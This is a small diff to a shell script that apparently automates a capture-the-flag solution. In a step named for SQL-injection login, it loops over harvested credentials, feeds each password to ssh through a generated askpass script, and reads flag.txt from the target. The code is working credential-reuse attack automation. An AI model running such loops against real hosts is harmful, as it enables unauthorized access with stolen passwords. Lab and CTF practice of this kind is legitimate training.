@@ -97,7 +97,7 @@ step_sqli_login() {
     [ -n "$user" ] || continue
     narrate "trying $user over ssh"
     printf '#!/bin/sh\necho "%s"\n' "$pass" > "$askpass"
-    flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -o StrictHostKeyChecking=accept-new \
+    flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -n -o StrictHostKeyChecking=accept-new \
       -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$user@$addr" 'cat flag.txt' 2>/dev/null | extract_flag)"
     [ -z "$flag" ] || break
   done <<< "$creds"
